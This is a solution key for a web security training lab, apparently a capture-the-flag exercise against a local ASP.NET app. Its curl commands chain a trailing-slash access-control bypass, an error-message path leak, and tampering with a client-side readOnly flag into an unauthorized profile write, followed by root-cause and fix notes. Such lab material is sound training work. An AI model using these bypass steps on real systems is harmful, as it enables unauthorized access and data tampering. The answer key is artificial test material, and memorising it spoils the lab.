# SOLUTION — Lab-01 (do not open before trying)

## Steps (curl shown for documentation; use Burp/Browser in practice)

```bash
# 0) recon
curl -i http://127.0.0.1:8001/                          # X-Powered-By: ASP.NET
curl http://127.0.0.1:8001/ReportServer
curl http://127.0.0.1:8001/ReportServer/Content_Usage   # -> /app/region/east/users.aspx

# 1) JS reverse engineering
curl http://127.0.0.1:8001/scripts/views/courses/index.js
curl http://127.0.0.1:8001/scripts/views/users/index.js # -> Users.aspx/manageUserProfile

# 2) trailing-slash bypass
curl -i http://127.0.0.1:8001/app/region/east/users.aspx    # 401
curl -i http://127.0.0.1:8001/app/region/east/users.aspx/   # 200 search page

# 2b) double-path error leak
curl http://127.0.0.1:8001/app/region/east/Users.aspx/Users.aspx/manageUserProfile
# -> error message discloses the correct path

# 3) response manipulation + write
curl http://127.0.0.1:8001/app/region/east/Users.aspx/manageUserProfile?userId=1001
# -> {"readOnly":1,...} flip it to 0 in the proxy (enables the form), then:
curl -X POST "http://127.0.0.1:8001/app/region/east/Users.aspx/manageUserProfile?userId=1001" \
  -H "Content-Type: application/json" -d '{"name":"Pwned"}'
# -> {"status":"saved","flag":"FLAG{...}"}
```

## Root cause
- Access control compares an exact string (`users.aspx` only) while the server normalizes `users.aspx/` to the same page. Mismatch = canonicalization bug.
- The readOnly flag is sent by the server but enforced in JS only. The server itself never blocks the POST. Client-side check != security.

## Fix
- Normalize every path before the auth check (lowercase + strip trailing slash + resolve doubled segments) with one centralized check.
- The server must reject any write from a non-admin session regardless of the client-supplied `readOnly` value.
